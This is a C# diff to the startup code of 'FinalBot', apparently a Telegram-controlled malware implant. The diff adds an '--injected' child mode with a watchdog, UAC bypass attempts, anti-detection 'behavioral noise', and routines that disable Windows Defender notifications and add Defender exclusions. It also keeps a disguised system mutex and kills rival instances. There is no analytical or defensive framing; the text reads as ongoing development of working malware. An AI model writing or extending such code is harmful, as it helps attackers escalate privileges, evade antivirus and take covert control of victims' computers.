@@ -30,40 +30,52 @@ namespace FinalBot
         {
             Console.WriteLine($"[DEBUG] Startup: PID={Process.GetCurrentProcess().Id}, Admin={ElevationService.IsAdmin()}");
             
-            // 1. Single Instance Check & Aggressive Cleanup
-            bool createdNew;
-            string mutexName = "Global\\Vanguard_System_Runtime_7X2B9";
-            _mutex = new Mutex(true, mutexName, out createdNew);
+            bool isInjected = Array.Exists(args, a => a == "--injected");
+            int fromPid = 0;
+            string fromArg = Array.Find(args, a => a.StartsWith("--from="));
+            if (fromArg != null && int.TryParse(fromArg.Split('=')[1], out var pidValue)) fromPid = pidValue;
 
-            if (!createdNew) 
+            if (!isInjected)
             {
-                Console.WriteLine("[-] Instance already active. Attempting aggressive recycle...");
-                DebugLog("Process already running. Killing existing instances to resolve Telegram conflict.");
-                
-                try {
-                    string currentName = Process.GetCurrentProcess().ProcessName;
-                    int currentId = Process.GetCurrentProcess().Id;
-                    foreach (var proc in Process.GetProcessesByName(currentName)) {
-                        if (proc.Id != currentId) {
-                            try {
-                                proc.Kill(true);
-                                Console.WriteLine($"[+] Terminated old instance: PID={proc.Id}");
-                            } catch { }
-                        }
-                    }
-                    Thread.Sleep(2000); // Give time for OS to release resources/sockets
-                } catch { }
-
-                // Try acquiring mutex again after cleanup
+                // 1. Single Instance Check & Aggressive Cleanup
+                bool createdNew;
+                string mutexName = "Global\\Vanguard_System_Runtime_7X2B9";
                 _mutex = new Mutex(true, mutexName, out createdNew);
-                if (!createdNew) {
-                    Console.WriteLine("[-] Critical: Failed to acquire mutex after cleanup. Exit.");
-                    return;
-                }
-                Console.WriteLine("[+] Mutex acquired after cleanup.");
-            }
 
-            DebugLog("Mutex acquired. Initializing services...");
+                if (!createdNew) 
+                {
+                    Console.WriteLine("[-] Instance already active. Attempting aggressive recycle...");
+                    DebugLog("Process already running. Killing existing instances to resolve Telegram conflict.");
+                    
+                    try {
+                        string currentName = Process.GetCurrentProcess().ProcessName;
+                        int currentId = Process.GetCurrentProcess().Id;
+                        foreach (var proc in Process.GetProcessesByName(currentName)) {
+                            if (proc.Id != currentId) {
+                                try {
+                                    proc.Kill(true);
+                                    Console.WriteLine($"[+] Terminated old instance: PID={proc.Id}");
+                                } catch { }
+                            }
+                        }
+                        Thread.Sleep(2000); // Give time for OS to release resources/sockets
+                    } catch { }
+
+                    // Try acquiring mutex again after cleanup
+                    _mutex = new Mutex(true, mutexName, out createdNew);
+                    if (!createdNew) {
+                        Console.WriteLine("[-] Critical: Failed to acquire mutex after cleanup. Exit.");
+                        return;
+                    }
+                    Console.WriteLine("[+] Mutex acquired after cleanup.");
+                }
+                DebugLog("Mutex acquired. Initializing services...");
+            }
+            else
+            {
+                DebugLog($"Running as V3 INJECTED child from PID {fromPid}.");
+                if (fromPid > 0) WatchdogManager.Start(fromPid);
+            }
 
             // 0. Extract Embedded Resources
             try { ResourceModule.ExtractAll(); }
@@ -105,8 +117,8 @@ namespace FinalBot
             // 3. Generate behavioral noise
             SafetyManager.AntiBehavior();
 
-            // 3. UAC Check & Bypass
-            if (!ElevationService.IsAdmin())
+            // 3. UAC Check & Bypass (Skip if already injected/elevated)
+            if (!isInjected && !ElevationService.IsAdmin())
             {
                 // Native path retrieval for stability
                 var sb = new StringBuilder(1024);
@@ -120,28 +132,27 @@ namespace FinalBot
                 _mutex = null;
                 Thread.Sleep(500);
 
-                // Professional stealth: Parent PID Spoofing (explorer.exe as parent)
+                // Try V3 Hardcore Injection first
                 if (ElevationService.RequestElevation(selfPath))
                 {
-                    DebugLog("UAC bypass successful (Detected child). Exiting parent.");
+                    DebugLog("UAC bypass successful (V3 or Chain). Exiting parent.");
                     Process.GetCurrentProcess().Kill();
                 }
                 
                 DebugLog("[UAC] All bypass methods failed. Continuing as User.");
                 _mutex = new Mutex(true, "Global\\Vanguard_System_Runtime_7X2B9", out _);
             }
-            else
+            else if (ElevationService.IsAdmin())
             {
                 DebugLog("Running as ADMIN. Applying Defender suppressions...");
                 
-                // Red Team Hardcore: Disable Defender GPOs and Notifications
-                SafetyManager.DisableDefenderGpo();
+                // Red Team Hardcore: Disable Defender Notifications and set exclusions
                 SafetyManager.DisableDefenderNotifications();
                 SafetyManager.BypassDefenderPlatform(); // Set exclusions
 
-                if (args.Length > 0 && Array.Exists(args, a => a == "--uac-child"))
+                if (Array.Exists(args, a => a == "--uac-child") || isInjected)
                 {
-                    DebugLog("Child process signaled success event.");
+                    DebugLog("Child process (admin) signaled success.");
                     try { 
                         EventWaitHandle successEvent = new EventWaitHandle(false, EventResetMode.ManualReset, "Global\\Vanguard_Elevation_Success");
                         successEvent.Set();
